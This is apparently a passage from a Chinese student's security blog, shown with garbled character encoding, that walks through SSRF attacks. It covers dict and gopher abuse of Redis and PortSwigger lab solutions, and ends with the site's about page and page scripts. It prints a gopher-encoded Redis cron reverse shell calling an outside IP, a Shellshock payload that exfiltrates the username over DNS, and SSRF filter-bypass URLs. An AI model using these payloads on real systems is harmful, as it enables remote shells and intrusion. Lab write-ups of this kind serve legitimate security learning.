å¯ä»¥æ¥æ”¶åˆ°å‘é€çš„ http æ•°æ®åŒ…ï¼Œç»“æ„éå¸¸ç®€å•ã€‚ 3.3 dict åè®®çš„ä½¿ç”¨ åˆ©ç”¨dictåè®®ï¼Œdict://ip/infoå¯è·å–æœ¬åœ°redisæœåŠ¡é…ç½®ä¿¡æ¯ã€‚ å¦‚æœåœ¨é¶åœºå½“ä¸­è¦å°è¯• dict åè®®è¯»å– Redis éœ€è¦å…ˆå®‰è£…ä¸€ä¸‹ redis-serverï¼Œå…·ä½“å¯è§ redis ä¸ dict åè®® åœ¨ä¸Šé¢è¿˜ä»‹ç»è¿‡redisæœåŠ¡ï¼Œçœ‹äº†å¾ˆå¤šSSRF åè®®ä¸­çš„åˆ©ç”¨éƒ½æ˜¯ç»“åˆ Redis æœåŠ¡çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±å…ˆåœ¨ssrf-basics å®¹å™¨é‡Œé¢å®‰è£…è¯¥æœåŠ¡ $ docker ps #æŸ¥çœ‹å®¹å™¨ç¼–å· $ docker exec -it å®¹å™¨ç¼–å· /bin/bash #è¿›å…¥å®¹å™¨ $ apt-get install redis-server # å®‰è£…redisæœåŠ¡ $ redis-server #å¼€å¯redisæœåŠ¡ å®‰è£…å¥½ä¹‹åï¼Œä¾¿å¯ä»¥åˆ©ç”¨åè®®æ”¶é›†ä¿¡æ¯åŠåå¼¹ shell åˆ©ç”¨dictåè®®ï¼Œdict://127.0.0.1:6379/infoå¯è·å–æœ¬åœ°redisæœåŠ¡é…ç½®ä¿¡æ¯ è¿™é‡Œå¤§æ¦‚æ˜¯å› ä¸º6379æ˜¯å…¶é»˜è®¤ç«¯å£ ç”¨ nc åœ¨æµ‹è¯•æœºç›‘å¬ï¼Œç„¶ååˆ©ç”¨ ssrf æ¼æ´æµ‹è¯•ä¸€ä¸‹ dict åè®®å‘é€å­—ç¬¦ä¸² infoï¼Œçœ‹çœ‹æ¥æ”¶æ–¹ä¼šæ”¶åˆ°ä»€ä¹ˆï¼š å¯ä»¥çœ‹åˆ°ä¸€å…±æ”¶åˆ°äº†ä¸‰è¡Œæ•°æ®ï¼Œç¬¬ä¸€è¡Œæ˜¯ç‰ˆæœ¬å·ï¼Œç¬¬äºŒè¡Œæ˜¯æˆ‘ä»¬å‘é€çš„æ•°æ®ï¼Œç¬¬ä¸‰è¡Œæ˜¯è‡ªåŠ¨æ·»åŠ çš„ QUITã€‚ dict åè®®ä¸æ”¯æŒæ¢è¡Œç¬¦ï¼Œæ²¡æœ‰åŠæ³•è¿›è¡Œæ¢è¡Œï¼Œç›¸å½“äºä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æ¥æ”»å‡»é‚£äº›éœ€è¦äº¤äº’çš„åº”ç”¨ï¼ˆæ¯”å¦‚éœ€è¦è®¤è¯çš„ redisï¼‰ã€‚ 3.4 gopher åè®®çš„ä½¿ç”¨ é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹é€šå¸¸æ”»å‡» Redis çš„å‘½ä»¤ï¼Œç„¶åè½¬åŒ–ä¸º Gopher å¯ç”¨çš„åè®® redis-cli -h $1 flushall echo -e \" */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 \"|redis-cli -h $1 -x set 1 redis-cli -h $1 config set dir /var/spool/cron/ redis-cli -h $1 config set dbfilename root redis-cli -h $1 save //redis-cliæŸ¥çœ‹æ‰€æœ‰çš„keysåŠæ¸…ç©ºæ‰€æœ‰çš„æ•°æ® è¿™ä¾¿æ˜¯å¸¸è§çš„expï¼Œåªéœ€è‡ªå·±æ›´æ”¹IPå’Œç«¯å£å³å¯ï¼Œæ”¹æˆé€‚é…äºGopheråè®®çš„ URLï¼š gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a ç»è¿‡urlè§£ç ä¾¿æ˜¯ï¼š gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/spool/cron/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit è¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸå›æ˜¾ æ¥ä¸‹æ¥åœ¨ ssrf-lab/basics å®¹å™¨é‡Œé¢æŸ¥çœ‹æ’å…¥çš„ KEY å€¼ï¼ŒéªŒè¯æ˜¯å¦æˆåŠŸ åˆ©ç”¨Gopher åè®®è¿˜å¯ä»¥æ”»å‡» FastCGIï¼Œæ”»å‡»å†…ç½‘ Vulnerability Web é«˜çº§æ–‡ç« ï¼šhttps://xz.aliyun.com/t/9554#toc-10 éœ€è¦å‘é€å¤šè¡Œæ•°æ®æ—¶ï¼Œå°±è¦ç”¨åˆ° gopher åè®®ï¼ŒåŒæ ·ä½¿ç”¨ nc ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æ¥æ”¶ç«¯æˆåŠŸæ¥æ”¶åˆ°äº†æ¢è¡Œçš„æ•°æ®ï¼Œæ‰€ä»¥ gopher åè®®å¯ä»¥ç”¨æ¥æ”»å‡»é‚£äº›éœ€è¦äº¤äº’çš„åº”ç”¨ã€‚ è‡³äºè¿™ä¸ª _ ç¬¦å·æš‚æ—¶ä¸çŸ¥é“ä¸ºä½•è¦+ï¼Œä¸‹é¢ç»“è®ºæœ‰è§£é‡Š ç»“è®ºï¼š 1ã€gopher åè®®ä¼šåƒæ‰ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¦å…ˆæ”¾ä¸€ä¸ªæ²¡æœ‰ç”¨çš„å­—ç¬¦ 2ã€å›è½¦æ˜¯ \\r ï¼Œä½†å¦‚æœç›´æ¥å¯¹ \\r è¿›è¡Œ url ç¼–ç ç»“æœæ˜¯ä¸å¯¹çš„ï¼Œå› ä¸ºç¼–ç çš„æ˜¯ \\ r \\ n å››ä¸ªå­—ç¬¦çš„ç»“æœï¼Œå®é™…å›è½¦åªæ˜¯ä¸¤ä¸ªä¸å¯è§çš„å­—ç¬¦ï¼Œurl ç¼–ç ä¸º %0d%0a 3ã€ç›´æ¥å‘ % å¯ä»¥æ­£å¸¸æ¥æ”¶ï¼Œä½†æ˜¯å‘ %0d%0a å°±ä¼šå‡ºç°æ•°æ®åŒ…å‘ä¸å‡ºå»çš„é—®é¢˜ï¼Œè¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡ url ç¼–ç æˆ %250d%250a æ‰èƒ½æ­£å¸¸å‘é€å‡ºå»ï¼ˆç›´æ¥ç”¨ curl å‘½ä»¤æµ‹è¯•æ²¡è¿™ä¸ªé—®é¢˜ï¼Œåº”è¯¥æ˜¯ web æœåŠ¡å™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡ url è§£ç å¯¼è‡´çš„ï¼‰ 3.5 Weblogic SSRFæ¼æ´ å‚è€ƒï¼šhttps://xz.aliyun.com/t/7333#toc-5 3.6 æ›´å¤šæ”»å‡»å¯¹è±¡ å‚è€ƒï¼šhttps://blog.chaitin.cn/gopher-attack-surfaces/ åäºŒã€Portswigger-Lab é’ˆå¯¹æœ¬åœ°æœåŠ¡å™¨çš„åŸºæœ¬ SSRF ç°åœ¨å…ˆæ˜æ™°å®éªŒä»»åŠ¡ æˆ‘ä»¬è®¿é—®å®éªŒå®¤ä¹‹åï¼Œbpå¼€å¯æ¥ç€éšä¾¿ç‚¹å‡»é¡µé¢çš„åŠŸèƒ½ï¼Œä¹‹åæˆ‘ä»¬åˆ°httpå†å²çœ‹çœ‹æœ‰ä½•äº®ç‚¹ å¯ä»¥å‘ç°è¿™é‡Œçš„/product/stockä¸­çš„stockApiå‚æ•°å¾ˆå¯ç–‘ï¼Œåé¢è·Ÿçš„æ˜¯urlåœ°å€ï¼Œæ ¹æ®é¢˜ç›®åˆšå¼€å§‹çš„æç¤ºï¼Œè¿™é‡Œè‚¯å®šå­˜åœ¨ssrfäº† æˆ‘ä»¬å°è¯•è®¿é—®http://localhost/admin å‘ç°æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°adminçš„é¡µé¢ï¼Œä½†å½“æˆ‘ä»¬æƒ³ç›´æ¥è®¿é—®adminå´æ˜¯æ²¡æœ‰æƒé™çš„ æ¥ä¸‹æ¥åˆ æ‰ç›®æ ‡ç”¨æˆ·å³å¯ï¼Œä½†å½“æˆ‘æ”¾åŒ…æˆåŠŸè¿›å…¥adminé¡µé¢æ—¶ï¼Œå‘ç°æ²¡æœ‰æƒåˆ©åˆ é™¤ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªæ˜¯é ç€ssrfä»…ä»…èƒ½è®¿é—®è€Œå·²ã€‚é‚£æˆ‘ä»¬ä¾æ—§è¦åˆ©ç”¨ssrfåˆ é™¤ç›®æ ‡ç”¨æˆ·ã€‚ æˆ‘ä»¬æ³¨æ„åˆ°ä¸Šé¢å›¾ä¸­çš„urlåœ°å€ï¼Œæˆ‘ä»¬åªéœ€è¦å°†stockApièµ‹å€¼ä¸ºï¼šhttp://localhost/admin/delete?username=carlos å³å¯ æˆåŠŸé€šå…³ é’ˆå¯¹å¦ä¸€ä¸ªåç«¯ç³»ç»Ÿçš„åŸºæœ¬ SSRF æ ¹æ®ä»»åŠ¡æç¤ºï¼Œè¿™é‡Œéœ€è¦åˆ©ç”¨ssrfè¿›è¡Œå†…ç½‘æ¢æµ‹æ‰«æï¼Œæˆ‘ä»¬ç›´æ¥å¼€å§‹ å¦‚ä¸‹å›¾ï¼Œè®¾ç½®å¥½çˆ†ç ´æ¨¡å—ç›´æ¥å¼€å§‹ æˆåŠŸæ¢æµ‹åˆ°å†…ç½‘ç®¡ç†å‘˜æœåŠ¡å™¨ï¼Œæ¥ç€æˆ‘ä»¬ç±»ä¼¼ä¸Šä¸€ä¸ªå®éªŒç›´æ¥åˆ é™¤ç›®æ ‡ç”¨æˆ·å³å¯ å¸¦å¤–æ£€æµ‹çš„ç›²SSRF çœ‹ä»»åŠ¡ä¼¼ä¹å°±æ˜¯ç®€å•çš„ssrfæ— å›æ˜¾é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆè®¿é—®é¶æœº è¿™é‡Œæˆ‘ä»¬æ ¹æ®ä»»åŠ¡æç¤ºï¼Œåœ¨ç‚¹å‡»å•†å“åŠ è½½åŠŸèƒ½çš„æ—¶å€™å°±æŠ“åŒ… å¦‚ä¸‹å›¾æˆ‘ä»¬ä¿®æ”¹refererå¤´ä¸ºæˆ‘ä»¬bpè‡ªå¸¦çš„collaboratorç»™çš„æœåŠ¡å™¨åœ°å€å³å¯ï¼Œå¦‚ä¸‹å›¾æˆåŠŸè§£å†³ å¸¦æœ‰åŸºäºé»‘åå•çš„è¾“å…¥æ»¤æ³¢å™¨çš„ SSRF ä»»åŠ¡ç›¸åŒï¼Œåªä¸è¿‡æœ‰äº†é˜²å¾¡ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹ï¼Œå¦‚ä¸‹å›¾ï¼Œå½“æˆ‘ä»¬å°è¯•ç®€å•è€Œåˆç›´æ¥çš„è®¿é—®ä¼šå‘ç°è¢«è¿‡æ»¤äº† è¿™é‡Œæµ‹è¯•äº†ä¸€ä¸‹å‘ç°è¿‡æ»¤çš„æ—¶localhostä¸adminå…³é”®è¯ï¼Œå‰é¢çš„æœ¬åœ°å›ç¯åœ°å€å¾ˆå®¹æ˜“ç»•è¿‡ï¼Œæˆ‘è¿™é‡Œé‡‡ç”¨çš„ç¼©å†™ç»•è¿‡ 127.1ï¼Œè‡³äºè¿™ä¸ªadminåˆšå¼€å§‹æƒ³ä¸åˆ°ï¼Œçœ‹äº†wpå‘ç°æ˜¯è¦è¿›è¡ŒäºŒæ¬¡urlç¼–ç å³å¯ç»•è¿‡ã€‚ è‡³äºä¸ºä½•æ˜¯äºŒæ¬¡urlç¼–ç ï¼Œæ˜¯å› ä¸ºè¿™é‡Œåœ¨åˆ°è¾¾å†…ç½‘æœåŠ¡å™¨ä¹‹å‰ç»è¿‡httpçš„è¯·æ±‚ä¼šå…ˆè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œåˆ°è¾¾ å†…ç½‘æœåŠ¡å™¨çš„æ—¶å€™åˆä¼šè¿›è¡Œä¸€æ¬¡è§£ç ï¼Œå¦‚æœæˆ‘ä»¬å€¼ç¼–ç ä¸€æ¬¡ï¼Œåœ¨åˆ°è¾¾ä¹‹å‰adminå°±æ˜¯åŸå‹äº†ï¼Œä¾æ—§ä¼šè¢«è¿‡æ»¤æ‰ %2561%2564%256d%2569%256e payloadï¼šhttp://127.1/%2561%2564%256d%2569%256e/delete?username=carlos SSRF é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡è¿‡æ»¤å™¨æ¼æ´ è¿™é‡Œæ²¡æƒ³é€šè¯¥å¦‚ä½•åšåªèƒ½çœ‹æç¤ºäº†ï¼Œè¿™é‡Œæ ¹æ®æç¤ºè¯´æ˜å‚æ•°stockApiåªèƒ½è®¿é—®æœ¬åœ°åº”ç”¨ï¼Œè¯´æ˜åº”è¯¥å»å¯»æ‰¾å…¶ä»–æœ‰é‡å®šå‘åŠŸèƒ½çš„å‚æ•° å¦‚ä¸‹å›¾ç‚¹å‡»æŠ“åŒ… å½“æˆ‘ä»¬å‘åŒ…ä¼šå‘ç°æœ‰ä¸€ä¸ªé‡å®šå‘åŠŸèƒ½ï¼Œé‚£æˆ‘ä»¬å°±èƒ½åˆ©ç”¨é‡å®šå‘å»è®¿é—®ç®¡ç†å‘˜æœåŠ¡å™¨äº† æˆåŠŸåˆ é™¤ å…·æœ‰ Shellshock åˆ©ç”¨çš„ç›² SSRF è¿™é‡Œæ²¡é‡åˆ°è¿‡ï¼Œå°±è·Ÿç€æç¤ºèµ°äº† åœ¨ Burp Suite Professional ä¸­ï¼Œä» BApp å•†åº—å®‰è£…â€œCollaborator Everywhereâ€æ‰©å±•ç¨‹åºã€‚ å°†å®éªŒå®¤çš„åŸŸæ·»åŠ åˆ° Burp Suite çš„ç›®æ ‡èŒƒå›´ï¼Œä»¥ä¾¿ Collaborator Everywhere å°†å®ƒä½œä¸ºç›®æ ‡ã€‚ æ¥ç€æµè§ˆç½‘ç«™ã€‚ è¯·æ³¨æ„ï¼Œå½“æ‚¨åŠ è½½äº§å“é¡µé¢æ—¶ï¼Œå®ƒä¼šé€šè¿‡ Referer æ ‡å¤´è§¦å‘ä¸ Burp Collaborator çš„ HTTP äº¤äº’ã€‚ è¯·æ³¨æ„ï¼ŒHTTP äº¤äº’åœ¨ HTTP è¯·æ±‚ä¸­åŒ…å« User-Agent å­—ç¬¦ä¸²ã€‚ å°†è¯·æ±‚å‘é€åˆ°äº§å“é¡µé¢ä»¥å‘é€ Burp Intruderã€‚ è½¬åˆ° Collaborator é€‰é¡¹å¡å¹¶ç”Ÿæˆå”¯ä¸€çš„ Burp Collaborator æœ‰æ•ˆè´Ÿè½½ã€‚å°†å…¶æ”¾å…¥ä»¥ä¸‹ Shellshock æœ‰æ•ˆè´Ÿè½½ä¸­ï¼š () { :; }; /usr/bin/nslookup $(whoami).sc8jhzowoa6hh3l54qtioxggh7nybrzg.oastify.com å°† Burp Intruder è¯·æ±‚ä¸­çš„ User-Agent å­—ç¬¦ä¸²æ›¿æ¢ä¸ºåŒ…å« Collaborator åŸŸçš„ Shellshock æœ‰æ•ˆè´Ÿè½½ã€‚ æ›´æ”¹ Referer æ ‡å¤´ï¼Œ http://192.168.0.1:8080 ç„¶åçªå‡ºæ˜¾ç¤º IP åœ°å€çš„æœ€åä¸€ä¸ªå…«ä½å­—èŠ‚ï¼ˆæ•°å­— 1 ï¼‰ï¼Œå•å‡»â€œæ·»åŠ  Â§â€ã€‚ å¦‚ä¸Šå›¾æˆ‘ä»¬è®¾ç½®å¥½åï¼Œå³å¯å¼€å§‹æ”»å‡»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæœ€ç»ˆæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°DNSè¯·æ±‚ï¼Œå…¶ä¸­DNSçš„å­åŸŸå³ä¸ºç›®æ ‡ç³»ç»Ÿçš„ç”¨æˆ·å åŸºäºç™½åå•çš„è¾“å…¥æ»¤æ³¢å™¨çš„ SSRF ä»»åŠ¡ä¾æ—§è€æ ·å­ï¼Œä¸è¿‡æ ¹æ®é¢˜ç›®æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™æ¬¡ç”±é»‘åå•é˜²å¾¡æ¢æˆäº†ç™½åå•ï¼Œè€æ ·å­æˆ‘ä»¬bpæŠ“åŒ… åœ¨å‡ æ¬¡å°è¯•ä¹‹åï¼Œè¿™é‡Œè¯´åªèƒ½å…è®¸åŸŸåhostä¸ºstock.weliketoshop.netï¼Œè¿™é‡Œæˆ‘å½“æ—¶æƒ³åˆ°äº†@ç­‰ç¬¦å·æ¥ç»•è¿‡ï¼Œä½†ç»ˆç©¶ä¸çŸ¥å…¶åŸç†ï¼Œè¿™é‡Œè·Ÿç€æç¤ºèµ°äº† è¿™é‡Œéœ€è¦å¯¹urlè§£æå™¨çš„å„ä¸ªç¬¦å·ä»¥åŠæ¯ä¸ªå­—æ®µçš„ä½œç”¨æœ‰ä¸€å®šçš„äº†è§£ï¼Œç®€å•å±•ç¤ºä¸€ä¸‹ &lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt; scheme: åè®®ï¼Œå¸¸è§çš„æœ‰ httpï¼ˆ80ï¼‰ï¼Œhttpsï¼ˆ443ï¼‰ï¼Œmailtoï¼Œftpï¼ˆ21ï¼‰ï¼Œrtspï¼Œrtspuï¼Œfileã€‚ userï¼šç”¨æˆ·åã€‚ passwordï¼š å¯†ç ã€‚ hostï¼šä¸»æœºã€‚ portï¼š ç«¯å£ã€‚ params: å‚æ•°ã€‚é€šå¸¸ä¸º key=valueã€‚ queryï¼šæŸ¥è¯¢å‚æ•°æˆ–æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ frag: ç‰‡æ®µï¼ˆåœ¨æµè§ˆå™¨ä¸­ä¼šè¢«è§£æä¸º window.location.hashï¼‰ã€‚ å› æ­¤æˆ‘ä»¬åšå¦‚ä¸‹å®éªŒï¼Œå‘ç°é¡µé¢å›æ˜¾500ï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸç»•è¿‡äº† ä½†æˆ‘ä»¬ç›®çš„æ˜¯æƒ³è¦ssrfï¼Œå› æ­¤æˆ‘ä»¬å°±æƒ³ç€å°†usernameæ”¹ä¸ºlocalhostï¼Œè¿™é‡Œåœ¨ç»è¿‡è¯¥webé¡µé¢çš„å“åº”ï¼Œä»–ä¼šè®¤ä¸ºåé¢çš„stockæ‰æ˜¯çœŸæ­£çš„hostã€‚ ä½†æˆ‘ä»¬åƒè®¿é—®çš„æ˜¯å†…ç½‘ä¸­çš„ç®¡ç†å‘˜æœåŠ¡å™¨ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦æ·»åŠ #ç¬¦å·ï¼Œè¿™æ ·è¯¥ç¬¦å·åé¢çš„éƒ½ä¼šè¢«è®¤ä¸ºå…¶å‰é¢urlåœ°å€çš„ç‰‡æ®µã€‚å³ï¼šhttp://locahost#@stock.weliketoshop.net ä½†è¿™é‡Œå‘ç°è¢«è¿‡æ»¤äº†ï¼Œæ ¹æœ¬åŸå› æ˜¯åœ¨æˆ‘ä»¬è¯·æ±‚åˆ°å†…éƒ¨æœåŠ¡å™¨ä¹‹å‰ï¼Œä¼šé¦–å…ˆå»è¯·æ±‚å½“å‰webé¡µé¢ï¼Œä½†æ­¤æ—¶ä»–ä¼šè®¤ä¸º#ç¬¦å·å‰é¢çš„åŸŸåæ‰æ˜¯çœŸæ­£çš„åŸŸåï¼Œä½†è¯¥åŸŸåä¸æ˜¯ç™½åå•æŒ‡å®šçš„ï¼Œå› æ­¤å‡­å€Ÿæ­¤æ€è·¯ï¼Œæˆ‘ä»¬ä¼šæƒ³åˆ°å¯¹#è¿›è¡Œurlç¼–ç ï¼Œç”±äºè¿™é‡Œåˆ©ç”¨çš„æ˜¯ssrfï¼Œä¸€å…±åšå‡ºäº†ä¸¤æ¬¡è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦urlç¼–ç ä¸¤æ¬¡ http://locahost%2523@stock.weliketoshop.net/admin/delete?username=carlos æˆåŠŸè§£å†³ï¼Œä¸‹é¢æ˜¯ä¸€äº›é’ˆå¯¹urlè§£æå™¨çš„å°çŸ¥è¯† ä¸€äº›åº”ç”¨ç¨‹åºåªå…è®¸åŒ¹é…ä»¥å…è®¸å€¼çš„ç™½åå•å¼€å¤´æˆ–åŒ…å«è¿™äº›å€¼çš„è¾“å…¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨URLè§£æä¸­çš„ä¸ä¸€è‡´æ€§æ¥ç»•è¿‡è¿‡æ»¤ã€‚ URL è§„èŒƒåŒ…å«äº†è®¸å¤šåœ¨å®ç° URL ç‰¹å®šè§£æå’ŒéªŒè¯æ—¶å®¹æ˜“è¢«å¿½ç•¥çš„ç‰¹æ€§: ï¼ˆ1ï¼‰ æ‚¨å¯ä»¥ä½¿ç”¨@å­—ç¬¦åœ¨ä¸»æœºåä¹‹å‰çš„URLä¸­åµŒå…¥å‡­æ®ã€‚ä¾‹å¦‚ï¼š https://expected-host@evil-host https://evil-host#expected-host ï¼ˆ3ï¼‰ æ‚¨å¯ä»¥åˆ©ç”¨DNSå‘½åå±‚æ¬¡ç»“æ„å°†æ‰€éœ€çš„è¾“å…¥æ”¾å…¥æ‚¨æ§åˆ¶çš„æ ‡å‡†DNSåç§°ä¸­ã€‚ä¾‹å¦‚ï¼š https://expected-host.evil-host ï¼ˆ4ï¼‰ æ‚¨å¯ä»¥é€šè¿‡urlç¼–ç å­—ç¬¦æ¥æ··æ·†urlè§£æä»£ç ã€‚å¦‚æœå®ç°è¿‡æ»¤å™¨çš„ä»£ç å¤„ç†urlç¼–ç å­—ç¬¦çš„æ–¹å¼ä¸å¤„ç†åç«¯HTTPè¯·æ±‚çš„ä»£ç ä¸åŒï¼Œé‚£ä¹ˆè¿™ä¸€ç‚¹ç‰¹åˆ«æœ‰ç”¨ åä¸‰ã€å‚è€ƒæ–‡ç«  é€šè¿‡Portwiggeçš„Webå®‰å…¨æ¼æ´è®­ç»ƒå¹³å°ï¼Œå­¦ä¹ SSRF PortSwigger SSRF Labs è§£æurlä¸­çš„#ã€&amp;ã€ï¼Ÿçš„ä½œç”¨å’Œæ„ä¹‰ æµ…è°ˆHTTPä¹‹URL","categories":["å¸¸è§topæ¼æ´"]},{"title":"å‹é“¾","path":"/friends/index.html","content":"æ¬¢è¿å¸ˆå‚…ä»¬äº’æ¢å‹é“¾ï¼Œä¸€èµ·è¿›æ­¥ï¼ï¼ï¼"},{"path":"/custom/js/ZYCode.js","content":"// è¿™å››ä¸ªå¸¸é‡æ˜¯å¤åˆ¶,å¤åˆ¶æˆåŠŸ,å±•å¼€,æ”¶ç¼© // æˆ‘ä½¿ç”¨çš„æ˜¯ https://fontawesome.com/ å›¾æ ‡, ä¸ç”¨å¯ä»¥æ”¹ä¸ºæ–‡å­—. const copyText = ''; const copySuccess = ''; const openText = ''; const closeText = ''; const codeElements = document.querySelectorAll('td.code'); codeElements.forEach((code, index) => { const preCode = code.querySelector('pre'); // è®¾ç½®idå’Œæ ·å¼ preCode.id = `ZYCode${index+1}`; preCode.style.webkitLineClamp = '6'; // æ·»åŠ å±•å¼€/æ”¶èµ·æŒ‰é’® if (preCode.innerHTML.split('').length > 6) { const codeCopyDiv = document.createElement('div'); codeCopyDiv.classList.add('CodeCloseDiv'); code.parentNode.parentNode.parentNode.parentNode.appendChild(codeCopyDiv); const codeCopyOver = document.createElement('button'); codeCopyOver.classList.add('CodeClose'); codeCopyOver.innerHTML = openText; const parent = code.parentNode.parentNode.parentNode.parentNode; const description = parent.childNodes.length === 3 ? parent.children[2] : parent.children[1]; description.appendChild(codeCopyOver); codeCopyOver.addEventListener('click', () => { if (codeCopyOver.innerHTML === openText) { const scrollTop = document.documentElement.scrollTop; const codeHeight = code.clientHeight; if (scrollTop < codeHeight) { document.documentElement.scrollTop += codeHeight - scrollTop; } preCode.style.webkitLineClamp = '99999'; codeCopyOver.innerHTML = closeText; } else { preCode.style.webkitLineClamp = '6'; codeCopyOver.innerHTML = openText; } }); } // æ·»åŠ å¤åˆ¶æŒ‰é’® const codeCopyBtn = document.createElement('div'); codeCopyBtn.classList.add('copy-btn'); codeCopyBtn.innerHTML = copyText; code.appendChild(codeCopyBtn); // æ·»åŠ å¤åˆ¶åŠŸèƒ½ codeCopyBtn.addEventListener('click', async () => { const currentCodeElement = code.querySelector('pre')?.innerText; await copyCode(currentCodeElement); codeCopyBtn.innerHTML = copySuccess; codeCopyBtn.classList.add('success'); setTimeout(() => { codeCopyBtn.innerHTML = copyText; codeCopyBtn.classList.remove('success'); }, 3000); }); }); async function copyCode(currentCode) { if (navigator.clipboard) { try { await navigator.clipboard.writeText(currentCode); } catch (error) { console.error(error); } } else { console.error('å½“å‰æµè§ˆå™¨ä¸æ”¯æŒæ­¤API'); } }"},{"title":"å…³äº","path":"/about/index.html","content":"ç®€å•çš„ä»‹ç» æœ¬äººåœ¨2023.7.25æ­èµ·åšå®¢äº†ï¼Œæ¥ä¸‹æ¥å°†ä¼šåœ¨è¿™é‡Œå‘å¸ƒæ–‡ç«  hybcxï¼Œç›®å‰æ˜¯å¤§äºŒåœ¨æ ¡ç”Ÿï¼ˆä»ç„¶ä¸ºèœé¸¡ä¸€æš~ï¼‰ ä¸­åŒ—å¤§å­¦ï¼Œï¼ŒWebæ‰‹ï¼ˆæ¸´æœ›æˆä¸ºä½¬ï¼‰ï¼Œå…¥é—¨æ—¶é—´çš„è¯æ˜¯2022.11.3å·ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬å¸¦å¸¦~ å–œæ¬¢ç©çš„æ¸¸æˆï¼šCFã€CSGO æœ¬äººä¹Ÿæ˜¯ä¸Šäº†å¤§å­¦å¶ç„¶æ¥è§¦åˆ°CTFï¼Œæ‰å¼€å§‹æ…¢æ…¢äº†è§£ç½‘ç»œå®‰å…¨ï¼Œä¹Ÿæ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ·±æ·±åœ°è¢«å…¶å¸å¼•ï¼ˆå†…å¿ƒå½“ä¸­è§‰å¾—ç½‘ç»œå®‰å…¨æ˜¯æ— æ•Œçš„ï¼ï¼ï¼ï¼‰ï¼Œå¾ˆåæ‚”æ²¡æœ‰æ—©ç‚¹äº†è§£åˆ°ç½‘ç»œå®‰å…¨ï¼Œå½“ç„¶ä¸€åˆ‡ä¹Ÿä¸è¿Ÿã€‚ åœ¨è¿™ä¸€è·¯ä¸Šé‡åˆ°å¾ˆå¤šå¤§ä½¬ï¼Œæœ‰å¹´é¾„æ¯”æˆ‘å¤§çš„ï¼Œä¹Ÿæœ‰æ¯”æˆ‘å°çš„ï¼ˆç”šè‡³åˆä¸­åŠæ‰“æˆ‘0.0ï¼‰ï¼Œå¸¸è¨€é“ï¼šâ€œå¾å¸ˆé“ä¹Ÿï¼Œå¤«åº¸çŸ¥å…¶å¹´ä¹‹å…ˆåç”Ÿäºå¾ä¹ï¼Ÿæ˜¯æ•…æ— è´µæ— è´±ï¼Œæ— é•¿æ— å°‘ï¼Œé“ä¹‹æ‰€å­˜ï¼Œå¸ˆä¹‹æ‰€å­˜ä¹Ÿã€‚â€å¸Œæœ›æˆ‘ä¼šåœ¨ç½‘ç»œå®‰å…¨è¿™æ¡é“è·¯ä¸Šä¸€ç›´èµ°ä¸‹å»ï¼Œæ¢ç´¢ç½‘ç»œå¥¥ç§˜ï¼"},{"path":"/custom/js/ZYDark.js","content":"/** * ç›‘å¬ç³»ç»Ÿä¸»é¢˜ * @type {MediaQueryList} */ var OSTheme = window.matchMedia('(prefers-color-scheme: dark)'); OSTheme.addEventListener(e => { if (window.localStorage.getItem('ZYI_Theme_Mode') === 'Moss') { ThemeChange('Moss'); } }) /** * ä¿®æ”¹åšå®¢ä¸»é¢˜ * @param theme äº®ä¸ºlight,æš—ä¸ºdark,è‡ªåŠ¨ä¸ºauto * @constructor */ const ThemeChange = (theme) => { if (theme === 'light' || (theme === 'Moss' && !OSTheme.matches)) { document.querySelector(\"html\").id = \"ZYLight\"; document.querySelector(\"#start > aside > footer > div > a:nth-child(6)\").style.filter= 'grayscale(0%)'; document.querySelector(\"#start > aside > footer > div > a:nth-child(5)\").style.filter= 'grayscale(100%)'; } else { document.querySelector(\"html\").id = \"ZYDark\"; document.querySelector(\"#start > aside > footer > div > 